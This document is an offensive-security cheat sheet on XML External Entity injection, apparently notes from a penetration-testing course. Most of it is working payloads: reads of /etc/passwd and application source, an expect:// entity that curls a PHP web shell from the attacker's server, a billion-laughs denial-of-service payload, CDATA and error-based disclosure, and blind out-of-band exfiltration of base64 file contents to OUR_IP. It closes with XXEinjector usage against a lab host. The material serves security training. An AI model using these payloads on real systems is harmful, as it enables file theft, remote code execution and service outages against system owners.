# XML External Entity (XXE) Injection

XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

**XML**
Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements.

XML Key Definitions

| Key         | Definition                                                                                                         | Example                                  |
|-------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------------|
| Tag         | The keys of an XML document, usually wrapped with (`</>`) characters.                                              | `<date>`                                 |
| Entity      | XML variables, usually wrapped with (`&` `;`) characters.                                                          | `&lt;`                                   |
| Element     | The root element or any of its child elements, with its value stored between a start-tag and an end-tag.           | `<date>01-01-2022</date>`                 |
| Attribute   | Optional specifications for any element stored in the tags, which may be used by the XML parser.                   | `version="1.0"/encoding="UTF-8"`          |
| Declaration | Usually the first line of an XML document, defining the XML version and encoding to use when parsing it.           | `<?xml version="1.0" encoding="UTF-8"?>` |


**XML DTD**
XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.

## Local File Disclosure

We can test whether the application is vulnerable by attempting to inject a new entity.
````
<!DOCTYPE email [
  <!ENTITY vuln "XXE Injection">
]>

&vuln;
````

**Reading Sensitive Files**
````
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
````

**Remote Code Execution**

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute. The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands.
````
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80

<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
````

**Denial of Service**
````
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
````

## Advanced File Disclosure

**Advanced Exfiltration with CDATA**

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a begin internal entity with <![CDATA[, an end internal entity with ]]>, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:
````
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
````
After that, if we reference the &joined; entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
````
<!ENTITY joined "%begin;%file;%end;">
````

XXE.dtd (Our Server)
````
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
````
````
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
````

**Error Based XXE**

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.
````
Our dtd file
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
````
````
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
````

## Blind Data Exfiltration

Our dtd File
````
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
````
````
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
````


## Automated OOB Exfiltration

One such tool is XXEinjector. This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

````
$ git clone https://github.com/enjoiz/XXEinjector.git
-----------------------------------------------------------------
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
-----------------------------------------------------------------
$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
````

